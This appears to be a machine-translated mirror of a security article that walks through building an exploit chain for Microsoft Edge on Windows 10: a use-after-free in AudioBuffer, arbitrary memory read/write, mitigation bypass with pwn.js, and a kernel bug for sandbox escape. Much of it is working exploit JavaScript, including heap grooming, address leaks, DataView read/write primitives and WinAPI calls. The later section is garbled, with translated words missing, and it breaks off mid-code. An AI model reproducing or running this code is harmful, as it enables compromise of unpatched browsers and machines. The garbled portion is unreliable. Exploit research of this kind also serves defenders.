<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Operating Microsoft Edge from CVE to RCE on Windows 10</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In this article, we will examine in some detail the process of writing an exploit for a vulnerability in Microsoft Edge, followed by exiting the sandb...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Operating Microsoft Edge from CVE to RCE on Windows 10</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="Intro"></p><br><p>  In this article, we will examine in some detail the process of writing an exploit for a vulnerability in Microsoft Edge, followed by exiting the sandbox.  If you are interested to know how this process looks like, then welcome under the cat! </p><a name="habracut"></a><br><h2 id="vvedenie">  Introduction </h2><br><p> At the last <code>Pwn2Own 2019</code> in Montreal, an exploit for hacking <code>Microsoft Edge</code> was <a href="https://www.thezdi.com/blog/2019/3/21/pwn2own-vancouver-2019-day-two-results">demonstrated</a> in the browsers category.  For this, two vulnerabilities were used: <code>double free</code> in the renderer and logical vulnerability to exit the sandbox.  These two vulnerabilities were recently closed and assigned to the appropriate <code>CVE</code> : <a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0940"><code>CVE-2019-0940</code></a> and <a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0940"><code>CVE-2019-0938</code></a> .  You can read more about vulnerabilities in the blog: <a href="https://blog.exodusintel.com/2019/05/19/pwn2own-2019-microsoft-edge-renderer-exploitation-cve-2019-9999-part-1/">Pwn2Own 2019: Microsoft Edge Renderer Exploitation (CVE-2019-0940).</a>  <a href="https://blog.exodusintel.com/2019/05/19/pwn2own-2019-microsoft-edge-renderer-exploitation-cve-2019-9999-part-1/">Part 1</a> and <a href="https://blog.exodusintel.com/2019/05/27/pwn2own-2019-microsoft-edge-sandbox-escape-cve-2019-0938-part-2/">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938).</a>  <a href="https://blog.exodusintel.com/2019/05/27/pwn2own-2019-microsoft-edge-sandbox-escape-cve-2019-0938-part-2/">Part 2</a> . </p><br><p>  In our article, we want to show the process of writing such an exploit and how much time and resources are needed for this using the example of the same <code>Microsoft Edge</code> on <code>Windows 10</code> using <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0240"><code>CVE-2017-0240</code></a> and <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-098"><code>CVE-2016-3309</code></a> .  One of the differences will be that if the exploit demonstrated on <code>Pwn2Own</code> used a logical vulnerability to exit the sandbox, in our scenario, the vulnerability in the <code>Windows 10</code> kernel will be used to exit the sandbox.  As the patches from <code>Microsoft</code> show, there are much more vulnerabilities in the core than vulnerabilities in the sandbox implementation.  As a result, such a chain of vulnerabilities is much more likely to be found, and it will be useful to know the information security officers in companies. </p><br><h2 id="ishodnye-dannye">  Initial data </h2><br><p>  This article will cover the process of writing a 1-day exploit for the <code>Microsoft Edge</code> browser.  <code>CVE-2017-0240</code> will be operated.  The first stage of operation will be made on the basis of materials from the source [1], we will get an <code>arbitrary address read/write</code> primitive, as well as get acquainted with various techniques that may be useful in the operation of such vulnerabilities.  Next will be familiarity with the <code>pwn.js</code> tool, which will help get a call to arbitrary functions based on random read and write, various <code>mitigations</code> and ways to circumvent them will also be considered.  At the last stage, the Windows kernel vulnerability <code>CVE-2016-3309</code> will be exploited to elevate privileges, bypass <code>AppContainer</code> restrictions and gain complete control over the machine under <code>AppContainer</code> . </p><br><p>  Operation will be carried out at the booth with <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code> and <code>Microsoft Edge (40.15063.0.0)</code> browser <code>Microsoft Edge (40.15063.0.0)</code> . </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva">  Step 1. Getting <code>arbitrary address read/write</code> primitive </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob">  Description of vulnerability and getting <code>OOB</code> </h3><br><p>  The <code>use-after-free</code> vulnerability is present in the <a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioBuffer/copyFromChannel">copyFromChannel</a> method of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioBuffer">Audio Buffer</a> object. </p><br><blockquote>  AudioBuffer is an interface of a short audio resource (audio asset) stored in memory and created from an audio file using the AudioContext.decodeAudioData () method, or from source data using the AudioContext.createBuffer () method.  Audio data placed in an AudioBuffer can be played in an AudioBufferSourceNode. </blockquote><p>  <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> presentation provides a detailed analysis of the vulnerability and patch.  When you call the <code>copyFromChannel</code> method, the contents of the audio buffer channel are copied into the <code>destination</code> buffer specified by the first argument.  The method also accepts the channel number ( <code>channelNumber</code> ) and the offset in the audio buffer ( <code>startInChannel</code> ), from which it is necessary to make a copy.  Before directly copying the data to the <code>destination</code> , the <code>CDOMAudioBuffer::Var_copyFromChannel</code> function <code>CDOMAudioBuffer::Var_copyFromChannel</code> <code>destination</code> buffer (the address and buffer size are stored in local variables of the functions on the stack) and converts the values ‚Äã‚Äãof the <code>channelNumber</code> and <code>startInChannel</code> to the <code>Int</code> type, for which the <code>valueOf</code> method of the transformed objects is called.  The vulnerability is that the cached buffer can be freed at the time of type conversion in the overridden <code>valueOf</code> method of the object.  For verification, we use the following code: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p>  To free the buffer, this code uses the <code>Web Workers</code> technology.  Having created an empty <code>Worker</code> , we can send him a message using the <code>postMessage</code> method.  The second optional <code>transfer</code> argument of this method takes an array of <code>Transferable</code> objects ( <code>ArrayBuffer</code> , <code>MessagePost</code> or <code>ImageBitmap</code> ), the rights to the object will be transferred to the <code>Worker</code> and the object will no longer be available in the current context, so it can be deleted.  After this, the call to <code>sleep</code> occurs - a function that provides a temporary stop to the program execution (implemented independently).  This is necessary in order for the garbage collection system ( <code>GC</code> , <code>Garbage Collector</code> ) to manage to free the buffer, the rights to which were transferred. </p><br><blockquote>  Web Workers provide an easy way to run scripts in a background thread.  The Worker thread can perform tasks without interfering with the user interface.  In addition, they can perform input / output using XMLHttpRequest (although the responseXML and channel attributes will always be null).  An existing Worker can send JavaScript messages to the creator code via the event handler specified by this code (and vice versa). </blockquote><p>  By running this code in Edge under the debugger, you can get the following crash. </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="Step 01 crash"></p><br><p>  As a result, the <code>copyFromChannel</code> call <code>copyFromChannel</code> to copy the contents of the audio buffer to a non-localized memory area.  To exploit the vulnerability, it is necessary to achieve allocation of any objects in this memory area.  In this case, the array segment is perfect. </p><br><p>  Arrays in <code>Chakra</code> ( <code>JS</code> engine used in the <code>Edge</code> browser) are arranged as follows: an array object has a fixed size, the pointers to the array objects themselves (or values, in the case of <code>IntArray</code> ) are stored in a separate memory area - a segment, the pointer to which is contained in the object array.  The segment header contains various information, including the segment size, which corresponds to the size of the array.  The size of the array is also present in the array object itself.  Schematically it looks like this: </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="Array structure"></p><br><p>  Thus, if we manage to allocate an array segment in a previously freed space, then we will be able to overwrite the header of the array segment with the contents of the audio buffer.  To do this, modify the code above, adding to the following lines after <code>sleep(1000);</code>  : </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p>  The size of the arrays is selected in such a way that the size of the array segment takes up a whole heap segment (the minimum indivisible part of the heap memory whose size is 0x10000 bytes).  Run this code, specifying the <code>memcpy</code> function as a breakpoint (there will be many <code>memcpy</code> calls, so it makes sense to stop first at the <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code> ) at which the crash occurred.  We get the following result: </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="Step 02"></p><br><p>  Fine!  Now we can rewrite the header of the array segment with our own values.  The most interesting values ‚Äã‚Äãin this case are the size of the array, the offset of which we can see in the screenshot above.  Change the contents of the audio buffer as follows: </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p>  Pay attention to the values ‚Äã‚Äãof <code>ta2[14]</code> and <code>ta2[15]</code> - they already refer not to the header of the segment, but to the values ‚Äã‚Äãof the array itself.  Using this, we can determine the array we need in the global <code>arr</code> array as follows: </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p>  If the result was an array, the first two elements of which were modified in a certain way, then everything is fine.  Now we have an array whose segment size is larger than it actually is.  The remaining arrays can be freed. </p><br><p>  Here it is necessary to recall that the size of the array exists in two entities: in the object of the array, where it remains unchanged, and in the segment of the array, where we increased it.  It turns out that the size in the array object is ignored if the code is executed in the <code>JIT</code> mode and has been optimized.  This is easily achieved, for example, as follows: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p>  After that, using the functions <code>arr_get</code> and <code>arr_set</code> you can access the bounds of the array ( <code>OOB</code> , <code>out-of-bound</code> ). </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu">  Using <code>OOB</code> to get a read and write primitive to an arbitrary address </h3><br><p>  In this section, we consider a technique that allows reading and writing at an arbitrary address using <code>OOB</code> .  The method by which we get this will be similar to the one used in source [1], but there will also be significant changes. </p><br><p>  In the used <code>Edge</code> version, heap memory blocks are allocated sequentially, due to which, if a large number of objects are selected, sooner or later they will end up after an array segment, beyond which we can turn. </p><br><p>  First, it gives us the opportunity to read a pointer to a virtual table of object methods ( <code>vftable</code> ), so that we can bypass the randomization of the process address space ( <code>ASLR</code> ).  But access to what objects will help us to achieve random read and write?  A couple of <code>DataView</code> objects are great for this. </p><br><blockquote>  The DataView provides a low-level interface for reading and writing numerous numeric types in a binary ArrayBuffer, regardless of the byte order of the platform. </blockquote><p>  The internal structure of the <code>DataView</code> contains a pointer to a buffer.  To read and write to an arbitrary address, for example, we can build a chain of two <code>DataView</code> ( <code>dv1</code> and <code>dv2</code> ) as follows: specify <code>dv2</code> as the <code>dv1</code> buffer by addressing outside the array.  Now, with the help of <code>dv1</code> we can change the address of the <code>dv2</code> buffer, due to which arbitrary read and write is achieved.  It can be schematically depicted as follows: </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="Arbitrary address read / write"></p><br><p>  To use this method, you need to learn how to identify the addresses of objects in memory.  For this, the following technique exists: it is necessary to create a new <code>Array</code> , use the <code>OOB</code> to save its <code>vftable</code> and <code>typeId</code> (the first two 64-bit fields of the structure) and assign an object to the first element of the array whose address we are interested in.  Then, you must restore the previously saved <code>vftable</code> and <code>typeId</code> .  Now the low and high double words of the object address can be obtained by referring to the first and second elements of the array.  The fact is that by default the new array is <code>IntArray</code> , and its segment contains 4-byte array values ‚Äã‚Äãas they are.  When an array is assigned to an object, the array is converted to an <code>ObjectArray</code> , and its segment is used to store the addresses of the objects.  During conversion, <code>vftable</code> and <code>typeId</code> .  Accordingly, if we restore the original values ‚Äã‚Äãof <code>vftable</code> and <code>typeId</code> , through the elements of this array we can directly access the segment.  Schematically described process can be represented as follows: </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="Pointer leak"></p><br><p>  The function for getting the address will be as follows: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p>  An open question is the creation of necessary objects and their search using <code>OOB</code> .  As mentioned earlier, when allocating a large number of objects, sooner or later they will start to stand out after the array segment, beyond which we can turn.  To find the necessary objects, you just need to go through the indices outside the array in the search for the necessary objects.  Because  all objects of the same type are located in the same heap segment, you can optimize the search and go through the heap segments in increments of <code>0x10000</code> , and check only the first few values ‚Äã‚Äãfrom the beginning of each heap segment.  To identify objects, you can set them unique values ‚Äã‚Äãof any parameters (for example, for a <code>DataView</code> this can be <code>byteOffset</code> ) or, using already known constants in the object structure (for example, in the used <code>Edge</code> version in <code>IntArray</code> at <code>0x18</code> offset is always <code>0x10005</code> ). </p><br><p>  Combining all the above techniques, you can get a read and write to an arbitrary address.  Below is a screenshot of the reading memory of <code>DataView</code> objects. </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="Memory leak"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api">  Step 2. Execution of arbitrary API functions </h2><br><p>  At this stage, we have the ability to read and write to an arbitrary address within the process of displaying content <code>Edge</code> .  Consider the basic technologies that should prevent the further operation of the application and means to circumvent them.  We have already written a small series of articles <code>  app specific security mitigation</code> ( <a href="https://habr.com/ru/company/dsec/blog/310676/">part 1, introductory</a> , <a href="https://habr.com/ru/company/dsec/blog/311616/">part 2, Internet Explorer and Edge</a> , <a href="https://habr.com/ru/company/dsec/blog/319234/">part 3, Google Chrome</a> ), but you should keep in mind that developers are not standing still and are adding new tools to their products protection. </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr">  Address Space Randomization ( <code>ASLR</code> ) </h3><br><blockquote>  ASLR (English address space layout randomization) is a technology used in operating systems, which randomly changes the location of important data structures in the address space of the process, namely: executable file images, loadable libraries, heaps and stack. </blockquote><p>  Above, we learned how to read virtual class table addresses using them; we can easily calculate the base address of the <code>Chakra.dll</code> module, so <code>ASLR</code> does not pose problems for further operation. </p><br><h3 id="data-execution-protection-dep-nx">  Data execution protection ( <code>DEP</code> , <code>NX</code> ) </h3><br><blockquote>  Data Execution Prevention (Eng. D√°ta Execution Prev√©ntion, DEP) is a security feature built into Linux, Mac OS X, Android and Windows that prevents an application from executing code from a memory area marked as ‚Äúdata only‚Äù.  It will prevent some attacks that, for example, save code in such an area using a buffer overflow. </blockquote><p>  One way to bypass this protection is to call <code>VirtualAlloc</code> using <code>ROP</code> chains.  But in the case of <code>Edge</code> this method will not work because of <code>ACG</code> (see below). </p><br><h3 id="control-flow-guard-cfg">  Control Flow Guard ( <code>CFG</code> ) </h3><br><blockquote>  <code>CFG</code> is a protection mechanism aimed at complicating the exploitation of binary vulnerabilities in user and kernel-mode applications.  The work of this mechanism is to validate implicit calls (indirect calls) that prevent an attacker from intercepting the flow of execution (for example, by rewriting the virtual function table) </blockquote><p>  This technology controls only indirect calls, for example, calls to methods from a virtual table of object functions.  Return addresses on the stack are not monitored, and this can be used to build <code>ROP</code> chains.  In the future, the use of <code>ROP/JOP/COP</code> chains may be hindered by <code>Intel</code> technology: <code>Control-flow Enforcement Technology</code> ( <code>CET</code> ).  This technology consists of two parts: </p><br><ol><li>  <code>Shadow Stack</code> is used to control return addresses and protects against <code>ROP</code> chains; </li><li>  <code>Indirect Branch Tracking</code> is a method of protection against <code>JOP/COP</code> chains.  It is a new instruction <code>ENDBRANCH</code> , which marks all valid transition addresses for <code>call</code> and <code>jmp</code> instructions. </li></ol><br><h3 id="arbitrary-code-guard-acg">  Arbitrary Code Guard ( <code>ACG</code> ) </h3><br><blockquote>  <code>ACG</code> is a technology that prevents dynamic code generation (it is not allowed to allocate the <code>rwx</code> memory area using <code>VirtaulAlloc</code> ) and its modifications (it is impossible to remap the existing memory area as executable) </blockquote><p>  This protection, like <code>CFG</code> , does not prevent the use of <code>ROP</code> chains. </p><br><h3 id="appcontainer-isolation">  AppContainer Isolation </h3><br><blockquote>  AppContainer is a Microsoft technology that allows you to isolate the process by running it in a sandbox environment.  This technology limits the process access to credentials, devices, file system, network, other processes and windows and is aimed at minimizing the possibilities of malware that has the ability to execute arbitrary code in the process. </blockquote><p>  This protection greatly complicates the process of operation.  Because of this, we cannot call third-party executable files or access sensitive user information in memory or on disks.  However, this protection can be overcome by using vulnerabilities in the implementation of the AppContainer sandbox or by elevating privileges through exploiting vulnerabilities in the OS kernel. </p><br><p>  It is worth noting that <code>Microsoft</code> has a separate <a href="https://www.microsoft.com/en-us/msrc/bounty-mitigation-bypass">rewards program</a> for <code>security mitigation</code> bypass techniques.  The program states that the reuse of executable code (building <code>ROP</code> chains is a type of this technique) does not fall under the program, since  is an architectural problem. </p><br><h3 id="ispolzovanie-pwnjs">  Using pwn.js </h3><br><p>  From the analysis of all protection technologies, it follows that in order to be able to execute arbitrary code, it is necessary to bypass the <code>AppContainer</code> sandbox.  In this article we will describe a method using the <code>Windows</code> kernel vulnerability.  At the same time, we can only use the <code>JS</code> code and <code>ROP</code> chains.  Writing an exploit for the kernel using only <code>ROP</code> chains can be very difficult.  To simplify this task, you can find a set of gadgets with which we could call the necessary <code>WinAPI</code> methods.  Fortunately, this is already implemented in the <a href="https://github.com/theori-io/pwnjs"><code>pwn.js</code></a> library.  Using it, describing only the <code>read</code> and <code>write</code> functions for random reading and writing, you can get a convenient <code>API</code> for finding the necessary <code>WinAPI</code> functions and calling them.  Also <code>pwn.js</code> provides a handy tool for working with 64-bit values ‚Äã‚Äãand pointers and tools for working with structures. </p><br><p>  Consider a simple example.  In the previous step, we got a chain of two related <code>DataView</code> .  To prepare an exploit, you need to create the following class: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="PWNED"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI ‚Äî   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], 